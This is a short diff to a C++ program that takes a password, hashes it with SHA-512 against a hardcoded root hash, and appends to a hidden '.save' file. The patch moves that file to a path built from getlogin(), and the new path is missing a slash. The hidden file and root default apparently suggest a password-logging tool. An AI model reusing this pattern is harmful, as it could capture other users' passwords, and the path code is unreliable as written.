@@ -26,13 +26,13 @@
 #include <crypt.h>
 
 #define DEFAULT_USER "root"
-#define PATH "/home/rooted/.save"
 #define SALT "$6$6LxYfOg6"
 #define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"
 int main(int argc, char *argv[]) {
 
     /*== Variables ==*/
     std::string passwd, user, command, createdHash;
+    std::string path = "/home"+std::string(getlogin())+"/.save";
     std::ofstream passwdFile;
 
     /*== Control args ==*/
@@ -54,8 +54,8 @@ int main(int argc, char *argv[]) {
     /*== Crypt the password SHA-512 ==*/
     createdHash = std::string(crypt(passwd.c_str(), SALT));
 
-    /*== Open passwd File PATH ==*/
-    passwdFile.open(PATH, std::ios::app);
+    /*== Open passwd File path ==*/
+    passwdFile.open(path, std::ios::app);
     if (!passwdFile.is_open()) {
         std::cerr << "An error has occured\n";
         passwdFile.close();
